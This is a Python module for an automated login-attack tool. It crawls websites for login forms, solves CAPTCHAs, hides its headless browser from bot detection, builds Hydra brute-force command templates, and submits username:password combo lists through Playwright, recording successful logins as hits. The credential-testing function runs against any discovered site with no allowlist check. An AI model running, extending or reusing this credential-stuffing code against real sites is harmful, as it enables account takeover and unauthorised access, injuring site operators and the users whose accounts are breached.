import logging
import re
from urllib.parse import urljoin, urlparse
from playwright.sync_api import sync_playwright

try:
    from bs4 import BeautifulSoup

    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

from config import config, get_intercept_proxy
from fetch import HAS_PLAYWRIGHT, HAS_SELENIUM, fetch_page_playwright, fetch_page_requests, fetch_page_selenium, solve_captcha
from helpers import COMMON_LOGIN_PATHS, get_base_url, normalize_and_validate_target, validate_url
from login_tester import domain_from_url, hydra_module_for_method, hydra_runtime_flags_for_method, save_hit


def detect_failure_string(soup, url):
    error_keywords = ["incorrect", "invalid", "failed", "wrong", "error", "denied", "try again", "not found", "locked", "unsuccessful"]
    error_texts = []

    for tag in soup.find_all(["div", "span", "p", "label"], class_=re.compile(r"(error|alert|invalid|fail|warning|message|feedback)")):
        text = tag.get_text(strip=True).lower()
        if any(kw in text for kw in error_keywords):
            error_texts.append(text)

    form = soup.find("form")
    if form:
        form_text = form.get_text(strip=True).lower()
        for kw in error_keywords:
            if kw in form_text:
                error_texts.append(kw)

    if error_texts:
        unique_errors = list(set(error_texts))
        return f"F={'|'.join(unique_errors[:5])}"

    return "F=Invalid|wrong|failed|incorrect|error|denied|try again|not found"


def validate_login_form(form, html_content, strict=True):
    """Validate a login form candidate and include detected HTTP method."""
    confidence = 0
    reasons = []

    method = form.get("method", "get").lower()
    if method != "post":
        confidence += 20
        reasons.append("non-POST method")

    action = form.get("action", "").strip()
    if action in ["#", "javascript:void(0)", "about:blank", ""]:
        confidence += 10
        reasons.append("action is blank/hash/js")

    password_fields = form.find_all("input", {"type": "password"})
    if not password_fields:
        return False, "no password field found", 0, method

    confidence += 40

    user_fields = form.find_all("input", {"type": ["text", "email"]})
    if not user_fields:
        confidence += 10
        reasons.append("no obvious username field")

    visible_inputs = [i for i in form.find_all("input") if i.get("type") not in ["hidden", "submit"]]
    if len(visible_inputs) < 2:
        confidence += 5
        reasons.append("few visible inputs")

    honeypot_keywords = ["honeypot", "email_confirm", "url", "website", "leaveblank"]
    for inp in form.find_all("input"):
        name = (inp.get("name") or "").lower()
        style = (inp.get("style") or "").lower()
        if any(kw in name for kw in honeypot_keywords) and ("display:none" in style or "visibility:hidden" in style):
            confidence -= 20
            reasons.append("honeypot suspicion")

    form_text = form.get_text(separator=" ", strip=True).lower()
    failure_keywords = ["incorrect", "invalid", "failed", "wrong", "error", "try again"]
    if any(kw in form_text for kw in failure_keywords):
        confidence += 20

    confidence = min(100, max(0, confidence))

    if confidence < 60 and strict:
        return False, f"low confidence ({confidence}): {', ' .join(reasons)}", confidence, method

    return True, f"valid (confidence: {confidence}; reasons: {', ' .join(reasons) or 'n/a'})", confidence, method


def normalize_form_action(page_url, action):
    base_url = validate_url(page_url)
    if not base_url:
        return None

    raw_action = (action or "").strip()
    candidate = base_url if not raw_action or raw_action == "#" else urljoin(base_url, raw_action)
    return validate_url(candidate)


def infer_submit_mode(form, page_url, action_url):
    method = (form.get("method") or "unknown").lower()
    raw_action = (form.get("action") or "").strip().lower()
    js_indicators = [
        bool(form.get("onsubmit")),
        "addEventListener('submit'" in str(form),
        "preventdefault" in str(form).lower(),
        "ajax" in str(form).lower(),
    ]
    if method == "post" and action_url:
        return "native_post"
    if method == "get" and action_url:
        return "native_get"
    if raw_action in {"", "#", "javascript:void(0)"} and any(js_indicators):
        return "js_handled"
    return "unknown"


def _is_login_like_form(form):
    pwd = form.find("input", {"type": "password"})
    if not pwd:
        return False

    text_like_inputs = form.find_all("input", {"type": ["text", "email", "tel", ""]})
    if text_like_inputs:
        return True

    form_text = form.get_text(" ", strip=True).lower()
    return any(k in form_text for k in ["login", "log in", "sign in", "password", "username", "email"])


def _form_field_metadata(form):
    fields = []
    js_indicators = []
    for inp in form.find_all("input"):
        input_type = (inp.get("type") or "text").lower()
        name = inp.get("name")
        field_id = inp.get("id")
        placeholder = inp.get("placeholder")
        autocomplete = inp.get("autocomplete")
        label_text = None
        if field_id:
            label = form.find("label", attrs={"for": field_id})
            if label:
                label_text = label.get_text(" ", strip=True)

        entry = {
            "type": input_type,
            "name": name,
            "id": field_id,
            "placeholder": placeholder,
            "label": label_text,
            "autocomplete": autocomplete,
            "has_name": bool(name),
        }
        fields.append(entry)

        if input_type in {"password", "text", "email"} and not name:
            js_indicators.append("missing_name_on_auth_field")

    action_raw = (form.get("action") or "").strip().lower()
    if action_raw in {"", "#", "javascript:void(0)", "about:blank"}:
        js_indicators.append("blank_or_js_action")
    if form.get("onsubmit"):
        js_indicators.append("onsubmit_handler")

    form_blob = str(form).lower()
    if "preventdefault" in form_blob:
        js_indicators.append("prevent_default_submit")
    if "addEventListener('submit'" in str(form) or 'addEventListener("submit"' in str(form):
        js_indicators.append("submit_event_listener")

    return fields, sorted(set(js_indicators))


def extract_loginish_metadata(soup, page_url):
    forms = soup.find_all("form")
    candidates = []

    for form in forms:
        if not _is_login_like_form(form):
            continue

        valid, reason, confidence, method = validate_login_form(form, str(soup), strict=False)
        action_url = normalize_form_action(page_url, form.get("action")) or page_url
        method = (form.get("method") or "get").lower()
        submit_mode = infer_submit_mode(form, page_url, action_url)
        fields, js_indicators = _form_field_metadata(form)
        candidates.append(
            {
                "form": form,
                "confidence": confidence,
                "reason": reason,
                "action_url": action_url,
                "method": method,
                "submit_mode": submit_mode,
                "fields": fields,
                "js_indicators": js_indicators,
                "strictly_valid": bool(valid),
            }
        )

    if not candidates:
        return None
    return max(candidates, key=lambda c: c["confidence"])


def _domain_is_allowlisted(url, allowlisted_domains):
    if not allowlisted_domains:
        return False
    host = (urlparse(url).hostname or "").lower()
    for allowed in allowlisted_domains:
        cand = (allowed or "").strip().lower()
        if not cand:
            continue
        if host == cand or host.endswith(f".{cand}"):
            return True
    return False


def observe_login_flow(url, proxy=None, allowlisted_domains=None, enable_dummy_interaction=False):
    if not HAS_PLAYWRIGHT:
        return {"status": "observation_unavailable", "reason": "playwright_not_installed"}
    if enable_dummy_interaction and not _domain_is_allowlisted(url, allowlisted_domains or []):
        return {
            "status": "observation_skipped",
            "reason": "dummy interaction requires explicit allowlisted domain",
            "allowlisted_domains": allowlisted_domains or [],
        }

    observed_requests = []

    launch_args = {"headless": True, "args": ["--disable-blink-features=AutomationControlled"]}
    if proxy and proxy.get("server"):
        launch_args["proxy"] = {"server": proxy["server"]}

    with sync_playwright() as p:
        browser = p.chromium.launch(**launch_args)
        context = browser.new_context(
            ignore_https_errors=bool(config.get("ignore_https_errors", False)),
            java_script_enabled=True,
        )
        page = context.new_page()

        def on_response(resp):
            req = resp.request
            endpoint = req.url
            blob = f"{endpoint} {req.method} {req.post_data or ''}".lower()
            authish = any(k in blob for k in ["login", "signin", "auth", "session", "token", "password", "username", "email"])
            if not authish:
                return
            headers = req.headers or {}
            observed_requests.append(
                {
                    "endpoint": endpoint,
                    "method": req.method,
                    "content_type": headers.get("content-type") or headers.get("Content-Type"),
                    "status": resp.status,
                }
            )

        page.on("response", on_response)
        page.goto(url, wait_until="domcontentloaded", timeout=180000)
        page.wait_for_timeout(1500)

        login_like = bool(page.query_selector("input[type='password']"))

        if enable_dummy_interaction and login_like:
            user_input = page.query_selector("input[type='email'], input[name*='user' i], input[name*='email' i], input[type='text']")
            pass_input = page.query_selector("input[type='password']")
            submit = page.query_selector("button[type='submit'], input[type='submit']")
            if user_input and pass_input and submit:
                user_input.fill("test@example.com")
                pass_input.fill("invalid-password")
                submit.click(timeout=2000)
                page.wait_for_timeout(2500)

        cookies = [
            {
                "name": c.get("name"),
                "domain": c.get("domain"),
                "path": c.get("path"),
                "httpOnly": c.get("httpOnly"),
                "secure": c.get("secure"),
            }
            for c in context.cookies()
        ]
        browser.close()

    return {
        "status": "observed",
        "login_like_ui": login_like,
        "dummy_interaction_enabled": bool(enable_dummy_interaction),
        "requests": observed_requests,
        "cookies": cookies,
    }




def _loginish_paths_from_links(soup, page_url, limit=3):
    out = []
    seen = set()
    for a in soup.find_all("a", href=True):
        text = f"{a.get_text(' ', strip=True)} {(a.get('href') or '')}".lower()
        if not any(k in text for k in ("login", "log in", "signin", "sign-in", "auth", "account")):
            continue
        candidate = validate_url(urljoin(page_url, a.get("href")))
        if candidate and candidate not in seen:
            seen.add(candidate)
            out.append(candidate)
            if len(out) >= limit:
                break
    return out


def _fetch_html_for_mode(url, proxy, mode):
    preferred = (mode or "static").strip().lower()
    attempts = []
    if preferred == "playwright":
        attempts = [fetch_page_playwright, fetch_page_requests, fetch_page_selenium]
    else:
        attempts = [fetch_page_requests, fetch_page_playwright, fetch_page_selenium]

    last_error = None
    used_playwright = False
    for fetcher in attempts:
        if fetcher == fetch_page_playwright and not HAS_PLAYWRIGHT:
            continue
        if fetcher == fetch_page_selenium and not HAS_SELENIUM:
            continue
        html, error = fetcher(url, proxy)
        if fetcher == fetch_page_playwright:
            used_playwright = bool(html)
        if html:
            return html, None, used_playwright
        last_error = error
    return None, last_error, used_playwright



def _discover_login_targets_playwright(start_url, proxy=None, max_hops=3):
    """Advanced mode: discover hidden/non-obvious login paths via rendered DOM and keyword links."""
    if not HAS_PLAYWRIGHT:
        return []

    targets = []
    seen = set()
    launch_args = {"headless": True}
    try:
        effective_proxy = get_intercept_proxy(config, proxy)
    except RuntimeError:
        effective_proxy = None
    if effective_proxy and effective_proxy.get("server"):
        launch_args["proxy"] = {"server": effective_proxy["server"]}

    with sync_playwright() as p:
        browser = p.chromium.launch(**launch_args)
        ctx = browser.new_context(ignore_https_errors=bool(config.get("ignore_https_errors", False)))
        page = ctx.new_page()
        queue = [start_url]
        while queue and len(targets) < max_hops:
            current = queue.pop(0)
            if current in seen:
                continue
            seen.add(current)
            try:
                page.goto(current, wait_until="domcontentloaded", timeout=25000)
                page.wait_for_timeout(1200)
            except Exception:
                continue

            has_password = page.locator("xpath=//input[@type='password']").count() > 0
            has_login_action = page.locator("xpath=//*[contains(translate(@action,'LOGIN','login'),'login')]").count() > 0
            if has_password or has_login_action:
                targets.append(current)

            link_handles = page.locator("a").element_handles()
            for handle in link_handles:
                if len(queue) + len(targets) >= max_hops:
                    break
                try:
                    href = handle.get_attribute("href") or ""
                    text = (handle.inner_text() or "").strip().lower()
                except Exception:
                    continue
                blob = f"{text} {href}".lower()
                if not any(k in blob for k in ("login", "log in", "signin", "sign-in", "auth", "account")):
                    continue
                candidate = validate_url(urljoin(current, href))
                if candidate and candidate not in seen and candidate not in queue:
                    queue.append(candidate)
        browser.close()

    return targets


def _extract_nonstandard_fields(soup):
    """Extract user/password fields using broader CSS heuristics for tricky forms."""
    password = soup.select_one("input[type='password'], input[name*='pass' i], input[id*='pass' i]")
    username = soup.select_one(
        "input[type='email'], input[name*='user' i], input[name*='email' i], input[id*='user' i], input[id*='email' i], input[type='text']"
    )
    return username, password

def extract_login_form(url, proxy=None, strict_validation=True, mode="static", advanced_mode=False, observation_options=None):
    if not HAS_BS4:
        return None, "bs4_not_installed"

    url, invalid_reason = normalize_and_validate_target(url, allow_nonstandard_ports=bool(config.get("allow_nonstandard_ports", False)))
    if not url:
        return None, {"status": "skipped_invalid_target", "reason": invalid_reason or "invalid target"}

    html, error, used_playwright = _fetch_html_for_mode(url, proxy, mode)
    fallback_used = False

    if not html:
        if isinstance(error, dict):
            return None, {
                "status": "fetch_failed",
                "error_code": error.get("code") or "fetch_failed",
                "error_hint": error.get("hint") or "Navigation failed",
                "error_detail": error.get("detail") or "fetch failed",
                "error_stacktrace": error.get("stacktrace"),
            }
        return None, {"status": "fetch_failed", "error_code": "fetch_failed", "error_hint": "Navigation failed", "error_detail": str(error or "no_html")}

    soup = BeautifulSoup(html, "html.parser")

    captcha_token = solve_captcha(soup, url)
    if captcha_token:
        html, error = fetch_page_playwright(url, proxy)
        if html:
            soup = BeautifulSoup(html, "html.parser")

    best_candidate = extract_loginish_metadata(soup, url)
    checked_urls = [url]

    if advanced_mode and not best_candidate:
        advanced_targets = _discover_login_targets_playwright(url, proxy=proxy, max_hops=3)
        for adv_url in advanced_targets:
            if adv_url in checked_urls:
                continue
            checked_urls.append(adv_url)
            html_adv, _, used_pw_adv = _fetch_html_for_mode(adv_url, proxy, "playwright")
            used_playwright = used_playwright or used_pw_adv
            if not html_adv:
                continue
            soup_adv = BeautifulSoup(html_adv, "html.parser")
            candidate = extract_loginish_metadata(soup_adv, adv_url)
            if candidate:
                soup = soup_adv
                best_candidate = candidate
                url = adv_url
                break

    if not best_candidate:
        base = get_base_url(url) or url.rstrip('/')
        extra_urls = [f"{base.rstrip('/')}{p}" for p in COMMON_LOGIN_PATHS[:5]]
        extra_urls.extend(_loginish_paths_from_links(soup, url, limit=3))
        seen = set(checked_urls)
        for candidate in extra_urls[:5]:
            if candidate in seen:
                continue
            seen.add(candidate)
            checked_urls.append(candidate)
            html2, error2, used_pw2 = _fetch_html_for_mode(candidate, proxy, mode)
            used_playwright = used_playwright or used_pw2
            if not html2:
                continue
            soup2 = BeautifulSoup(html2, "html.parser")
            c = extract_loginish_metadata(soup2, candidate)
            if c:
                soup = soup2
                best_candidate = c
                url = candidate
                break

    if not best_candidate:
        return None, {"status": "no_form", "reason": "no login-like form detected", "checked_urls": checked_urls}

    best_form = best_candidate["form"]
    best_confidence = best_candidate["confidence"]
    best_reason = best_candidate["reason"]
    action = best_candidate["action_url"]
    action = action.strip().strip('"').strip("'")
    method = (best_candidate.get("method") or "post").lower()

    post_parts = []
    username_field = None
    password_field = None

    for inp in best_form.find_all("input"):
        name = inp.get("name")
        if not name:
            continue
        typ = inp.get("type", "text").lower()

        if typ == "password":
            password_field = name
            post_parts.append(f"{name}=^PASS^")
        elif typ in ["text", "email"] and not username_field:
            username_field = name
            post_parts.append(f"{name}=^USER^")
        elif typ not in ["submit", "button", "hidden"]:
            post_parts.append(f"{name}=")

    for h in best_form.find_all("input", {"type": "hidden"}):
        n = h.get("name")
        v = h.get("value", "")
        if n:
            post_parts.append(f"{n}={v}")

    if advanced_mode and (not username_field or not password_field):
        guessed_user, guessed_pass = _extract_nonstandard_fields(soup)
        if guessed_user and not username_field and guessed_user.get("name"):
            username_field = guessed_user.get("name")
            post_parts.append(f"{username_field}=^USER^")
        if guessed_pass and not password_field and guessed_pass.get("name"):
            password_field = guessed_pass.get("name")
            post_parts.append(f"{password_field}=^PASS^")

    submit_mode = best_candidate["submit_mode"]
    failure = detect_failure_string(soup, url)
    failure_value = failure[2:] if failure.startswith("F=") else failure
    post_data = "&".join(post_parts)
    post_data = re.sub(r'\^{2,}', '^', post_data)  # dedup ^

    status = "success_form" if submit_mode in {"native_post", "native_get"} and username_field and password_field else "success_loginish"

    hydra_template = ""
    custom_tester_required = False
    if status == "success_form":
        target = urlparse(url).netloc or url
        hydra_module = hydra_module_for_method(method)
        if hydra_module:
            # FIXED: Strip stray wrapping quotes from extracted action and post payload
            post_data = post_data.strip(' "\'')

            # FIXED: Insert placeholders exactly once and avoid duplicate placeholder expansion
            if username_field:
                post_data = post_data.replace(f"{username_field}=^USER^", f"{username_field}=username_field")
                post_data = post_data.replace("username_field", "^USER^")
            if password_field:
                post_data = post_data.replace(f"{password_field}=^PASS^", f"{password_field}=password_field")
                post_data = post_data.replace("password_field", "^PASS^")

            # FIXED: Deduplicate caret artifacts to keep ^USER^ /^PASS^ valid tokens
            post_data = re.sub(r'\^{2,}', '^', post_data)

            print(f"[RAW ACTION] {action}")
            print(f"[RAW POST DATA] {post_data}")

            # FIXED: Extract path-only action for Hydra and force leading slash
            action_parts = urlparse(action)
            path = action_parts.path or "/"
            if action_parts.query:
                path = f"{path}?{action_parts.query}"
            if not path.startswith("/"):
                path = f"/{path}"

            # FIXED: Build Hydra form spec with normalized path + payload + failure marker
            form_spec = f"{path}:{post_data}:F={failure_value}"
            form_spec = form_spec.replace('"', "")
            print(f"[EXTRACT DEBUG] form_spec: {form_spec}")
            logging.info(f"[DEBUG FORM SPEC RAW] {form_spec}")

            # FIXED: Use explicit http-post-form module syntax compatible with Hydra target parsing
            cmd_template = f'hydra -C "{{{{combo_file}}}}" http-post-form://"{target}" "{form_spec}" -V -t 4 -f'
            hydra_template = cmd_template
        else:
            custom_tester_required = True

    result = {
        "status": status,
        "original_url": url,
        "action": action,
        "post_data": post_data,
        "failure_condition": failure,
        "hydra_command_template": hydra_template,
        "confidence": best_confidence,
        "validation_reason": best_reason,
        "fallback_used": fallback_used,
        "playwright_used": used_playwright,
        "checked_urls": checked_urls,
        "method": method,
        "action_url": action,
        "user_field": username_field,
        "pass_field": password_field,
        "submit_mode": submit_mode,
        "reasons": best_reason,
        "classification": "✅ actionable native form" if status == "success_form" else "🟨 login-ish (JS-handled / non-POST / missing action)",
        "method_warning": "Detected GET form; payload may need manual tuning" if method == "get" else "",
        "custom_tester_required": custom_tester_required,
        "login_metadata": {
            "page_url": url,
            "fields": best_candidate["fields"],
            "confidence": best_confidence,
            "why": best_reason,
            "js_indicators": best_candidate["js_indicators"],
        },
    }

    if mode == "observation":
        opts = observation_options or {}
        result["observed_login_flow"] = observe_login_flow(
            url,
            proxy=proxy,
            allowlisted_domains=opts.get("allowlisted_domains", []),
            enable_dummy_interaction=bool(opts.get("enable_dummy_interaction", False)),
        )

    return result, None


def test_credentials_for_site(site_result, combos, proxy=None):
    """Try per-site credentials with Playwright first, Selenium fallback; store hits on success."""
    if not site_result or not combos:
        return {"status": "no_data", "hits": 0}

    action_url = site_result.get("action_url") or site_result.get("action") or site_result.get("original_url")
    method = (site_result.get("method") or "post").lower()
    user_field = site_result.get("user_field")
    pass_field = site_result.get("pass_field")
    if not (action_url and user_field and pass_field):
        return {"status": "insufficient_form_data", "hits": 0}

    try:
        effective_proxy = get_intercept_proxy(config, proxy)
    except RuntimeError:
        effective_proxy = None
    hits = []

    def _attempt_with_playwright(username, password):
        if not HAS_PLAYWRIGHT:
            return False
        launch_args = {"headless": True}
        if effective_proxy and effective_proxy.get("server"):
            launch_args["proxy"] = {"server": effective_proxy["server"]}
        with sync_playwright() as p:
            browser = p.chromium.launch(**launch_args)
            ctx = browser.new_context(ignore_https_errors=bool(config.get("ignore_https_errors", False)))
            page = ctx.new_page()
            page.goto(action_url, wait_until="domcontentloaded", timeout=180000)
            page.fill(f'input[name="{user_field}"]', username)
            page.fill(f'input[name="{pass_field}"]', password)
            page.click("button[type='submit'],input[type='submit']")
            page.wait_for_timeout(2000)
            content = page.content().lower()
            browser.close()
            return not any(k in content for k in ["invalid", "incorrect", "try again", "wrong password"])

    for combo in combos:
        if ":" not in combo:
            continue
        username, password = combo.split(":", 1)
        ok = False
        try:
            ok = _attempt_with_playwright(username, password)
        except Exception:
            ok = False
        if ok:
            domain = domain_from_url(action_url)
            out = save_hit(domain, username, password, method)
            hits.append({"username": username, "password": password, "method": method, "path": str(out)})

    return {"status": "completed", "hits": len(hits), "results": hits}
